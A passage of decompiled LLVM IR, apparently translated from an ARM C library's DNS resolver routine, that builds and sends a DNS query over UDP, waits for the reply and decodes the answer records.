  store i32 %v15_1d648, i32* %ip.global-to-local, align 4
  %v1_1d64c = inttoptr i32 %v12_1d640 to i32*
  %v2_1d64c = load i32, i32* %v1_1d64c, align 4
  %v3_1d64c = add i32 %v0_1d63c, 20
  %v4_1d64c = inttoptr i32 %v3_1d64c to i32*
  %v5_1d64c = load i32, i32* %v4_1d64c, align 4
  store i32 %v5_1d64c, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  store i32 %v2_1d64c, i32* %stack_var_-88, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_1d660 = load i32, i32* @r8, align 4
  %v2_1d660 = add i32 %v0_1d660, 28
  %v3_1d660 = inttoptr i32 %v2_1d660 to i32*
  %v4_1d660 = load i32, i32* %v3_1d660, align 4
  store i32 %v4_1d660, i32* %ip.global-to-local, align 4
  store i32 120428, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1d660)
  store i32 %v2_1d66c, i32* @r6, align 4
  %v0_1d670 = load i32, i32* @r7, align 4
  store i32 %v0_1d670, i32* %r1.global-to-local, align 4
  store i32 512, i32* @r2, align 4
  %v0_1d678 = load i32, i32* @sl, align 4
  %v2_1d67c = inttoptr i32 %v0_1d678 to i8*
  %v3_1d67c = call i32 @__GI_memset(i8* %v2_1d67c, i32 %v0_1d670)
  %v0_1d680 = load i32, i32* @r7, align 4
  store i32 %v0_1d680, i32* %r1.global-to-local, align 4
  store i32 48, i32* @r2, align 4
  %v3_1d68c = call i32 @__GI_memset(i8* %v2_1d68c, i32 %v0_1d680)
  store i32 %v3_1d624, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_1d69c = load i32, i32* @sl, align 4
  store i32 %v0_1d69c, i32* %r1.global-to-local, align 4
  store i32 %v3_1d624, i32* %stack_var_-192, align 4
  %v6_1d6b0 = call i32 @__encode_header(i32* nonnull %stack_var_-192, i32 %v0_1d69c, i32 512, i32 %v3_1d624, i32 %v3_1d624)
  store i32 %v6_1d6b0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d6b4 = icmp slt i32 %v6_1d6b0, 0
  br i1 %v1_1d6b4, label %dec_label_pc_1db70, label %dec_label_pc_1d6bc

dec_label_pc_1d6bc:                               ; preds = %bb218
  store i32 %v0_1d428, i32* @ip, align 4
  store i32 %v1_1d470, i32* @r5, align 4
  %v0_1d6cc = load i32, i32* @sl, align 4
  %v2_1d6cc = add i32 %v0_1d6cc, %v6_1d6b0
  store i32 %v2_1d6cc, i32* %r1.global-to-local, align 4
  %v1_1d6d0 = sub i32 512, %v6_1d6b0
  store i32 %v1_1d470, i32* %stack_var_-60, align 4
  store i32 %v0_1d428, i32* %stack_var_-56, align 4
  %v4_1d6dc = call i32 @__encode_question(i32* nonnull %stack_var_-60, i32 %v2_1d6cc, i32 %v1_1d6d0)
  store i32 %v4_1d6dc, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d6e0 = icmp slt i32 %v4_1d6dc, 0
  br i1 %v1_1d6e0, label %dec_label_pc_1db70, label %dec_label_pc_1d6e8

dec_label_pc_1d6e8:                               ; preds = %dec_label_pc_1d6bc
  %v3_1d6ec = load i16, i16* %stack_var_-104, align 2
  %v4_1d6ec = sext i16 %v3_1d6ec to i32
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_1d6f8 = call i32 @socket(i32 %v4_1d6ec, i32 2, i32 17)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d6fc = icmp slt i32 %v3_1d6f8, 0
  br i1 %v1_1d6fc, label %dec_label_pc_1db48, label %dec_label_pc_1d708

dec_label_pc_1d708:                               ; preds = %dec_label_pc_1d6e8
  store i32 %v2_1d644, i32* %r1.global-to-local, align 4
  %v3_1d710 = call i32 @__libc_connect(i32 %v3_1d6f8, i32 %v2_1d644, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d714 = icmp slt i32 %v3_1d710, 0
  br i1 %v1_1d714, label %dec_label_pc_1db48, label %dec_label_pc_1d71c

dec_label_pc_1d71c:                               ; preds = %dec_label_pc_1d708
  %v0_1d71c = load i32, i32* @r5, align 4
  %v1_1d71c = load i32, i32* @r4, align 4
  %v2_1d71c = add i32 %v1_1d71c, %v0_1d71c
  %v0_1d720 = load i32, i32* @r7, align 4
  store i32 %v0_1d720, i32* %r3.global-to-local, align 4
  %v0_1d728 = load i32, i32* @sl, align 4
  store i32 %v0_1d728, i32* %r1.global-to-local, align 4
  %v4_1d72c = call i32 @__libc_send(i32 %v3_1d6f8, i32 %v0_1d728, i32 %v2_1d71c, i32 %v0_1d720)
  store i32 1178, i32* %r3.global-to-local, align 4
  %v0_1d734 = load i32, i32* @r8, align 4
  %v2_1d734 = add i32 %v0_1d734, 1178
  %v3_1d734 = inttoptr i32 %v2_1d734 to i8*
  %v4_1d734 = load i8, i8* %v3_1d734, align 1
  %v6_1d734 = zext i8 %v4_1d734 to i32
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_1d73c = mul nuw nsw i32 %v6_1d734, 1000
  store i32 %v2_1d73c, i32* @r4, align 4
  store i32 %v2_1d740, i32* @r5, align 4
  br label %dec_label_pc_1d744

dec_label_pc_1d744:                               ; preds = %thread-pre-split, %dec_label_pc_1d71c
  %v0_1d750 = phi i32 [ %v1_1d790, %thread-pre-split ], [ %v2_1d73c, %dec_label_pc_1d71c ]
  store i32 %v3_1d6f8, i32* %r3.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 %v2_1d74c, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v3_1d6f8, i32* %stack_var_-48, align 4
  %v7_1d764 = call i32 @__GI_poll(i32 %v2_1d740, i32 1, i32 %v0_1d750, i32 %v3_1d6f8, i32 %v3_1d6f8, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_1d76c = load i32, i32* @sl, align 4
  store i32 %v0_1d76c, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp219 = icmp slt i32 %v7_1d764, 1
  br i1 %tmp219, label %dec_label_pc_1db48, label %dec_label_pc_1d780

dec_label_pc_1d780:                               ; preds = %dec_label_pc_1d744
  %v5_1d780 = call i32 @__libc_recv(i32 %v3_1d6f8, i32 %v0_1d76c, i32 512, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v2_1d784 = icmp ugt i32 %v5_1d780, 10
  store i1 %v2_1d784, i1* %cpsr_c.global-to-local, align 1
  %v8_1d78c = icmp sgt i32 %v5_1d780, 11
  br i1 %v8_1d78c, label %dec_label_pc_1d7b8, label %dec_label_pc_1d790

dec_label_pc_1d790:                               ; preds = %dec_label_pc_1d7b8, %dec_label_pc_1d7d4, %dec_label_pc_1d780
  %v0_1d790 = load i32, i32* @r4, align 4
  %v1_1d790 = add i32 %v0_1d790, -1000
  store i32 %v1_1d790, i32* @r4, align 4
  %v7_1d790 = icmp eq i32 %v0_1d790, 1000
  %tmp283 = zext i1 %v7_1d790 to i32
  %. = xor i32 %tmp283, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d7a0 = icmp slt i32 %v5_1d780, 0
  br i1 %v1_1d7a0, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_1d790
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1db48

thread-pre-split:                                 ; preds = %dec_label_pc_1d790
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1d790, label %dec_label_pc_1db48, label %dec_label_pc_1d744

dec_label_pc_1d7b8:                               ; preds = %dec_label_pc_1d780
  store i32 %v2_1d66c, i32* %r1.global-to-local, align 4
  %v0_1d7bc = load i32, i32* @sl, align 4
  %v2_1d7c0 = inttoptr i32 %v0_1d7bc to i8*
  %v3_1d7c0 = call i32 @__decode_header(i8* %v2_1d7c0, i32 %v2_1d66c)
  %v3_1d7c4 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_1d7c4, i32* %r3.global-to-local, align 4
  store i32 %v3_1d624, i32* %r1.global-to-local, align 4
  %v3_1d7cc = icmp uge i32 %v3_1d7c4, %v3_1d624
  store i1 %v3_1d7cc, i1* %cpsr_c.global-to-local, align 1
  %v9_1d7cc = icmp eq i32 %v3_1d7c4, %v3_1d624
  br i1 %v9_1d7cc, label %dec_label_pc_1d7d4, label %dec_label_pc_1d790

dec_label_pc_1d7d4:                               ; preds = %dec_label_pc_1d7b8
  store i32 %tmp161, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1d7d8, label %dec_label_pc_1d790, label %dec_label_pc_1d7e0

dec_label_pc_1d7e0:                               ; preds = %dec_label_pc_1d7d4
  store i32 %v1_1d7e4, i32* %r3.global-to-local, align 4
  store i1 %v2_1d7e8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_1d7e4.cmp, label %dec_label_pc_1d81c, label %dec_label_pc_1d7f0

dec_label_pc_1d7f0:                               ; preds = %dec_label_pc_1d7e0
  store i1 %v2_1d7f4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1d7f4, label %dec_label_pc_1d810, label %dec_label_pc_1d7fc

dec_label_pc_1d7fc:                               ; preds = %dec_label_pc_1d7f0
  store i32 %v4_1d568, i32* @r5, align 4
  %v1_1d800 = add i32 %v4_1d568, -1
  store i32 %v1_1d800, i32* %r3.global-to-local, align 4
  %v0_1d804 = load i32, i32* @sb, align 4
  %v3_1d804 = icmp uge i32 %v0_1d804, %v1_1d800
  store i1 %v3_1d804, i1* %cpsr_c.global-to-local, align 1
  %v5_1d808 = icmp slt i32 %v0_1d804, %v1_1d800
  br i1 %v5_1d808, label %.thread7, label %dec_label_pc_1d810

.thread7:                                         ; preds = %dec_label_pc_1d7fc
  %v7_1d808 = add i32 %v0_1d804, 1
  br label %dec_label_pc_1db58

dec_label_pc_1d810:                               ; preds = %dec_label_pc_1d7fc, %dec_label_pc_1d7f0
  %v0_1d810 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1d844

dec_label_pc_1d81c:                               ; preds = %dec_label_pc_1d7e0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1d81c, label %dec_label_pc_1d824, label %dec_label_pc_1db48

dec_label_pc_1d824:                               ; preds = %dec_label_pc_1d81c
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp214, label %dec_label_pc_1d83c, label %dec_label_pc_1d84c

dec_label_pc_1d83c:                               ; preds = %dec_label_pc_1d824
  %v0_1d83c = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1d844

dec_label_pc_1d844:                               ; preds = %dec_label_pc_1d810, %dec_label_pc_1d83c
  %storemerge2 = phi i32 [ %v0_1d83c, %dec_label_pc_1d83c ], [ %v0_1d810, %dec_label_pc_1d810 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1d83c ], [ 1, %dec_label_pc_1d810 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_1d844 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_1d844, align 4
  br label %dec_label_pc_1db90

dec_label_pc_1d84c:                               ; preds = %dec_label_pc_1d824
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_1d850.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @ip, align 4
  %v2_1d850 = add i32 %v0_1d850.pre, 12
  store i32 %v2_1d850, i32* @r4, align 4
  %v3_1d850 = icmp ugt i32 %v0_1d850.pre, -13
  store i1 %v3_1d850, i1* %cpsr_c.global-to-local, align 1
  %v9_1d850 = icmp eq i32 %v2_1d850, 0
  br i1 %v9_1d850, label %dec_label_pc_1db48, label %dec_label_pc_1d858

dec_label_pc_1d858:                               ; preds = %dec_label_pc_1d84c
  %v2_1d85c = add i32 %v5_1d780, -12
  store i32 %v2_1d85c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp223 = icmp slt i32 %v2_1d85c, 1
  br i1 %tmp223, label %dec_label_pc_1db48, label %dec_label_pc_1d86c

dec_label_pc_1d864thread-pre-split:               ; preds = %dec_label_pc_1d888
  %v2_1d89415 = add i32 %v2_1d878, -1
  store i32 %v2_1d89415, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp224 = icmp slt i32 %v2_1d89415, 1
  br i1 %tmp224, label %dec_label_pc_1db48, label %dec_label_pc_1d86c

dec_label_pc_1d86c:                               ; preds = %dec_label_pc_1d858, %dec_label_pc_1d864thread-pre-split
  %v1_1d890 = phi i32 [ %v2_1d89415, %dec_label_pc_1d864thread-pre-split ], [ %v2_1d85c, %dec_label_pc_1d858 ]
  %v0_1d86c = phi i32 [ %v2_1d880, %dec_label_pc_1d864thread-pre-split ], [ %v2_1d850, %dec_label_pc_1d858 ]
  %v1_1d86c = inttoptr i32 %v0_1d86c to i8*
  %v2_1d86c = load i8, i8* %v1_1d86c, align 1
  %v3_1d86c = zext i8 %v2_1d86c to i32
  store i32 %v3_1d86c, i32* %r3.global-to-local, align 4
  %v5_1d86c = add i32 %v0_1d86c, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d870 = icmp eq i8 %v2_1d86c, 0
  %v2_1d878 = sub i32 %v1_1d890, %v3_1d86c
  store i32 %v2_1d878, i32* @lr, align 4
  %v1_1d87c = and i32 %v3_1d86c, 192
  store i32 %v1_1d87c, i32* @ip, align 4
  %v2_1d880 = add i32 %v3_1d86c, %v5_1d86c
  br i1 %v2_1d870, label %dec_label_pc_1d89c, label %dec_label_pc_1d888

dec_label_pc_1d888:                               ; preds = %dec_label_pc_1d86c
  %v2_1d888 = icmp eq i32 %v1_1d87c, 192
  store i1 %v2_1d888, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1d888, label %.thread9, label %dec_label_pc_1d864thread-pre-split

.thread9:                                         ; preds = %dec_label_pc_1d888
  %v2_1d88c = add i32 %v0_1d86c, 2
  %v2_1d890 = add i32 %v1_1d890, -2
  store i32 %v2_1d890, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1d89c

dec_label_pc_1d89c:                               ; preds = %dec_label_pc_1d86c, %.thread9
  %v1_1d8a8 = phi i32 [ %v2_1d88c, %.thread9 ], [ %v5_1d86c, %dec_label_pc_1d86c ]
  %v0_1d89c = phi i32 [ %v2_1d890, %.thread9 ], [ %v1_1d890, %dec_label_pc_1d86c ]
  %v1_1d89c = add i32 %v0_1d89c, -3
  %v2_1d89c = icmp ugt i32 %v0_1d89c, 2
  store i1 %v2_1d89c, i1* %cpsr_c.global-to-local, align 1
  %v3_1d89c = sub i32 2, %v0_1d89c
  %v4_1d89c = and i32 %v3_1d89c, %v0_1d89c
  %v5_1d89c = icmp slt i32 %v4_1d89c, 0
  %v6_1d89c = icmp slt i32 %v1_1d89c, 0
  %v7_1d89c = icmp eq i32 %v0_1d89c, 3
  %v3_1d8a0 = xor i1 %v6_1d89c, %v5_1d89c
  %v4_1d8a0 = or i1 %v7_1d89c, %v3_1d8a0
  br i1 %v4_1d8a0, label %dec_label_pc_1db48, label %dec_label_pc_1d8a4

dec_label_pc_1d8a4:                               ; preds = %dec_label_pc_1d89c
  %v1_1d8a4 = sub i32 -8, %v0_1d850.pre
  %v2_1d8a8 = add i32 %v1_1d8a8, %v1_1d8a4
  store i32 %v2_1d8a8, i32* %r3.global-to-local, align 4
  %v3_1d8a8 = icmp ult i32 %v2_1d8a8, %v1_1d8a4
  store i1 %v3_1d8a8, i1* %cpsr_c.global-to-local, align 1
  %v8_1d8a8 = icmp slt i32 %v2_1d8a8, 0
  br i1 %v8_1d8a8, label %dec_label_pc_1db48, label %dec_label_pc_1d8cc

dec_label_pc_1d8cc:                               ; preds = %dec_label_pc_1d8a4
  %v2_1d8b4 = add i32 %v2_1d8a8, 12
  store i32 %v2_1d8b4, i32* %r1.global-to-local, align 4
  store i32 %v2_1d8d4, i32* @r5, align 4
  store i32 %v2_1d8d8, i32* @r7, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_1db1c56, label %dec_label_pc_1d8f0, label %dec_label_pc_1db20

dec_label_pc_1d8f0:                               ; preds = %dec_label_pc_1d8cc, %dec_label_pc_1daf8.dec_label_pc_1d8f0_crit_edge
  %v0_1d8f4 = phi i32 [ %v0_1d8f4.pre, %dec_label_pc_1daf8.dec_label_pc_1d8f0_crit_edge ], [ %v0_1d850.pre, %dec_label_pc_1d8cc ]
  %stack_var_-460.364 = phi i32 [ %v2_1db00, %dec_label_pc_1daf8.dec_label_pc_1d8f0_crit_edge ], [ %v2_1d8b4, %dec_label_pc_1d8cc ]
  %stack_var_-452.061 = phi i32 [ %v1_1db04, %dec_label_pc_1daf8.dec_label_pc_1d8f0_crit_edge ], [ 0, %dec_label_pc_1d8cc ]
  %stack_var_-480.260 = phi i32 [ %stack_var_-480.1, %dec_label_pc_1daf8.dec_label_pc_1d8f0_crit_edge ], [ 1, %dec_label_pc_1d8cc ]
  store i32 256, i32* @ip, align 4
  store i32 %stack_var_-460.364, i32* @r1, align 4
  store i32 %v2_1d8d4, i32* %r3.global-to-local, align 4
  %v5_1d908 = call i32 @__decode_dotted(i32 %v0_1d8f4, i32 %stack_var_-460.364, i32 %v5_1d780, i32 %v2_1d8d4, i32 256)
  store i32 %v5_1d908, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d90c = icmp slt i32 %v5_1d908, 0
  br i1 %v1_1d90c, label %dec_label_pc_1d9dc, label %dec_label_pc_1d914

dec_label_pc_1d914:                               ; preds = %dec_label_pc_1d8f0
  store i32 %stack_var_-460.364, i32* %r1.global-to-local, align 4
  %v1_1d91c = add i32 %v5_1d908, 10
  store i32 %v1_1d91c, i32* @sb, align 4
  %v2_1d920 = sub i32 %v5_1d780, %stack_var_-460.364
  %v2_1d924 = sub i32 %v2_1d920, %v1_1d91c
  store i32 %v2_1d924, i32* %r3.global-to-local, align 4
  %v3_1d924 = icmp uge i32 %v2_1d920, %v1_1d91c
  store i1 %v3_1d924, i1* %cpsr_c.global-to-local, align 1
  %v8_1d924 = icmp slt i32 %v2_1d924, 0
  br i1 %v8_1d924, label %dec_label_pc_1d9d4.thread, label %dec_label_pc_1d934

dec_label_pc_1d9d4.thread:                        ; preds = %dec_label_pc_1d914
  store i32 %v2_1d924, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1d9dc

dec_label_pc_1d934:                               ; preds = %dec_label_pc_1d914
  %v2_1d938 = call i32 @__GI_strdup(i8* %v1_1d938)
  %v0_1d940 = load i32, i32* @r4, align 4
  %v2_1d940 = add i32 %v0_1d940, %stack_var_-460.364
  %v0_1d944 = load i32, i32* @sl, align 4
  %v2_1d944 = add i32 %v0_1d944, %v2_1d940
  store i32 %v2_1d944, i32* %r1.global-to-local, align 4
  %v1_1d948 = add i32 %v2_1d944, 2
  store i32 %v1_1d948, i32* %ip.global-to-local, align 4
  %v1_1d94c = add i32 %v2_1d944, 4
  store i32 %v1_1d94c, i32* %r3.global-to-local, align 4
  %v1_1d950 = add i32 %v2_1d944, 5
  %v2_1d950 = inttoptr i32 %v1_1d950 to i8*
  %v3_1d950 = load i8, i8* %v2_1d950, align 1
  %v4_1d950 = zext i8 %v3_1d950 to i32
  %v1_1d958 = add i32 %v2_1d944, 8
  %v2_1d958 = inttoptr i32 %v1_1d958 to i8*
  %v3_1d958 = load i8, i8* %v2_1d958, align 1
  %v4_1d958 = zext i8 %v3_1d958 to i32
  %v1_1d964 = add i32 %v2_1d944, 6
  %v2_1d964 = inttoptr i32 %v1_1d964 to i8*
  %v3_1d964 = load i8, i8* %v2_1d964, align 1
  %v4_1d964 = zext i8 %v3_1d964 to i32
  store i32 %v4_1d964, i32* %r3.global-to-local, align 4
  %v1_1d968 = add i32 %v2_1d944, 9
  %v2_1d968 = inttoptr i32 %v1_1d968 to i8*
  %v3_1d968 = load i8, i8* %v2_1d968, align 1
  %v4_1d968 = zext i8 %v3_1d968 to i32
  %v3_1d970 = inttoptr i32 %v2_1d944 to i8*
  %v4_1d970 = load i8, i8* %v3_1d970, align 1
  %v6_1d970 = zext i8 %v4_1d970 to i32
  %v1_1d974 = add i32 %v2_1d944, 3
  %v2_1d974 = inttoptr i32 %v1_1d974 to i8*
  %v3_1d974 = load i8, i8* %v2_1d974, align 1
  %v4_1d974 = zext i8 %v3_1d974 to i32
  store i32 %v4_1d974, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v2_1d97c = inttoptr i32 %v1_1d948 to i8*
  %v3_1d97c = load i8, i8* %v2_1d97c, align 1
  %v4_1d97c = zext i8 %v3_1d97c to i32
  store i32 %v4_1d97c, i32* %ip.global-to-local, align 4
  %v1_1d980 = add i32 %v2_1d944, 1
  %v2_1d980 = inttoptr i32 %v1_1d980 to i8*
  %v3_1d980 = load i8, i8* %v2_1d980, align 1
  %v4_1d980 = zext i8 %v3_1d980 to i32
  %v4_1d984 = mul nuw nsw i32 %v4_1d958, 256
  %v5_1d984 = or i32 %v4_1d968, %v4_1d984
  store i32 %v5_1d984, i32* @r6, align 4
  store i32 %v4_1d950, i32* @r7, align 4
  %v4_1d98c = mul nuw nsw i32 %v6_1d970, 256
  %v5_1d98c = or i32 %v4_1d980, %v4_1d98c
  store i32 %v5_1d98c, i32* @lr, align 4
  %v4_1d990 = mul nuw nsw i32 %v4_1d97c, 256
  %v5_1d990 = or i32 %v4_1d990, %v4_1d974
  store i32 %v5_1d990, i32* %r3.global-to-local, align 4
  store i32 %v2_1d924, i32* @r5, align 4
  store i32 %v4_1d964, i32* @ip, align 4
  %v1_1d9a4 = add i32 %v2_1d944, 10
  store i32 %v1_1d9a4, i32* %r1.global-to-local, align 4
  %v1_1d9a8 = add i32 %v2_1d940, 10
  store i32 %v1_1d9a8, i32* @r4, align 4
  %v2_1d9ac = sub i32 %v2_1d924, %v5_1d984
  %v3_1d9ac = icmp uge i32 %v2_1d924, %v5_1d984
  store i1 %v3_1d9ac, i1* %cpsr_c.global-to-local, align 1
  %tmp226 = sub i32 0, %v2_1d9ac
  %v6_1d9ac = and i32 %v2_1d924, %tmp226
  %v7_1d9ac = icmp slt i32 %v6_1d9ac, 0
  %v8_1d9ac = icmp slt i32 %v2_1d9ac, 0
  store i32 %v2_1d938, i32* %stack_var_-144, align 4
  %v2_1d9cc = xor i1 %v8_1d9ac, %v7_1d9ac
  br i1 %v2_1d9cc, label %dec_label_pc_1d9dc, label %dec_label_pc_1d9d4

dec_label_pc_1d9d4:                               ; preds = %dec_label_pc_1d934
  %v0_1d9d0 = load i32, i32* @sb, align 4
  %v2_1d9d0 = add i32 %v0_1d9d0, %v5_1d984
  store i32 %v2_1d9d0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d9d4 = icmp slt i32 %v2_1d9d0, 0
  br i1 %v1_1d9d4, label %dec_label_pc_1d9dc, label %dec_label_pc_1d9f8

dec_label_pc_1d9dc:                               ; preds = %dec_label_pc_1d9d4, %dec_label_pc_1d934, %dec_label_pc_1d8f0, %dec_label_pc_1d9d4.thread
  store i32 %stack_var_-452.061, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d9e0 = icmp eq i32 %stack_var_-452.061, 0
  br i1 %v2_1d9e0, label %dec_label_pc_1db48, label %dec_label_pc_1d9e8

dec_label_pc_1d9e8:                               ; preds = %dec_label_pc_1d9dc
  store i32 %tmp144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1d9ec, label %dec_label_pc_1db48, label %dec_label_pc_1db20

dec_label_pc_1d9f8:                               ; preds = %dec_label_pc_1d9d4
  store i32 %stack_var_-480.260, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d9fc = icmp eq i32 %stack_var_-480.260, 0
  br i1 %v2_1d9fc, label %dec_label_pc_1daa0, label %dec_label_pc_1da04

dec_label_pc_1da04:                               ; preds = %dec_label_pc_1d9f8
  %v0_1da04 = load i32, i32* @fp, align 4
  %v1_1da04 = add i32 %v0_1da04, 28
  store i32 %v1_1da04, i32* %r3.global-to-local, align 4
  %v1_1da08 = inttoptr i32 %v1_1da04 to i32*
  %v2_1da08 = load i32, i32* %v1_1da08, align 4
  store i32 %v2_1da08, i32* @r3, align 4
  %v3_1da08 = add i32 %v0_1da04, 32
  %v4_1da08 = inttoptr i32 %v3_1da08 to i32*
  %v5_1da08 = load i32, i32* %v4_1da08, align 4
  store i32 %v5_1da08, i32* @ip, align 4
  %v6_1da08 = add i32 %v0_1da04, 36
  %v7_1da08 = inttoptr i32 %v6_1da08 to i32*
  %v8_1da08 = load i32, i32* %v7_1da08, align 4
  store i32 %v8_1da08, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v0_1da04, i32* @r0, align 4
  store i32 %v2_1d8d8, i32* @r1, align 4
  %v0_1da24 = call i32 @memcpy()
  %v0_1da28 = load i32, i32* @fp, align 4
  %v1_1da28 = add i32 %v0_1da28, 4
  %v2_1da28 = inttoptr i32 %v1_1da28 to i32*
  %v3_1da28 = load i32, i32* %v2_1da28, align 4
  %v2_1da2c = icmp ugt i32 %v3_1da28, 23
  store i1 %v2_1da2c, i1* %cpsr_c.global-to-local, align 1
  %v7_1da2c = icmp eq i32 %v3_1da28, 24
  br i1 %v7_1da2c, label %dec_label_pc_1da50, label %dec_label_pc_1da34

dec_label_pc_1da34:                               ; preds = %dec_label_pc_1da04
  %v1_1da34 = add i32 %v0_1da28, 28
  %v2_1da34 = inttoptr i32 %v1_1da34 to i32*
  %v3_1da34 = load i32, i32* %v2_1da34, align 4
  store i32 %v3_1da34, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1da38 = icmp eq i32 %v3_1da34, 0
  br i1 %v2_1da38, label %dec_label_pc_1db20, label %dec_label_pc_1da40

dec_label_pc_1da40:                               ; preds = %dec_label_pc_1da34
  store i1 %v2_1da44, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1da44, label %dec_label_pc_1da50, label %bb227

bb227:                                            ; preds = %dec_label_pc_1da40
  store i1 %v3_1da48, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_1da48, label %dec_label_pc_1da50, label %dec_label_pc_1db20

dec_label_pc_1da50:                               ; preds = %dec_label_pc_1da40, %bb227, %dec_label_pc_1da04
  store i32 %v0_1d428, i32* %r1.global-to-local, align 4
  %v3_1da54 = icmp uge i32 %v3_1da28, %v0_1d428
  store i1 %v3_1da54, i1* %cpsr_c.global-to-local, align 1
  %v9_1da54 = icmp eq i32 %v3_1da28, %v0_1d428
  br i1 %v9_1da54, label %dec_label_pc_1da64, label %bb228

bb228:                                            ; preds = %dec_label_pc_1da50
  br label %dec_label_pc_1daf8

dec_label_pc_1da64:                               ; preds = %dec_label_pc_1da50
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.061, i32* @r5, align 4
  %v1_1da6c = add i32 %v0_1da28, 16
  %v2_1da6c = inttoptr i32 %v1_1da6c to i32*
  %v3_1da6c = load i32, i32* %v2_1da6c, align 4
  %v2_1da70 = sub i32 %tmp159, %stack_var_-452.061
  %v1_1da74 = add i32 %v2_1da70, -1
  store i32 %v1_1da74, i32* %r3.global-to-local, align 4
  %v1_1da78 = add i32 %v3_1da6c, 4
  %v2_1da7c = mul i32 %v1_1da78, %v1_1da74
  store i32 %v2_1da7c, i32* %r1.global-to-local, align 4
  %v1_1da80 = add i32 %v0_1da28, 32
  %v2_1da80 = inttoptr i32 %v1_1da80 to i32*
  %v3_1da80 = load i32, i32* %v2_1da80, align 4
  %v3_1da84 = icmp uge i32 %v2_1da7c, %v3_1da80
  store i1 %v3_1da84, i1* %cpsr_c.global-to-local, align 1
  %v2_1da88 = add i32 %v0_1da28, 36
  %v3_1da88 = inttoptr i32 %v2_1da88 to i32*
  store i32 %v1_1da74, i32* %v3_1da88, align 4
  %tmp286 = icmp ugt i32 %v2_1da7c, %v3_1da80
  br i1 %tmp286, label %dec_label_pc_1db20, label %dec_label_pc_1da90

dec_label_pc_1da90:                               ; preds = %dec_label_pc_1da64
  store i32 0, i32* @r7, align 4
  %v1_1da98 = load i32, i32* @fp, align 4
  %v2_1da98 = add i32 %v1_1da98, 36
  %v3_1da98 = inttoptr i32 %v2_1da98 to i32*
  store i32 0, i32* %v3_1da98, align 4
  br label %dec_label_pc_1daf8

dec_label_pc_1daa0:                               ; preds = %dec_label_pc_1d9f8
  store i32 %v2_1d938, i32* @r0, align 4
  %v0_1daa4 = call i32 @free()
  store i32 %v5_1d98c, i32* %r3.global-to-local, align 4
  store i32 %v0_1d428, i32* @ip, align 4
  %v3_1dab0 = icmp uge i32 %v5_1d98c, %v0_1d428
  store i1 %v3_1dab0, i1* %cpsr_c.global-to-local, align 1
  %v9_1dab0 = icmp eq i32 %v5_1d98c, %v0_1d428
  br i1 %v9_1dab0, label %dec_label_pc_1dab8, label %dec_label_pc_1daf8

dec_label_pc_1dab8:                               ; preds = %dec_label_pc_1daa0
  %v0_1dab8 = load i32, i32* @fp, align 4
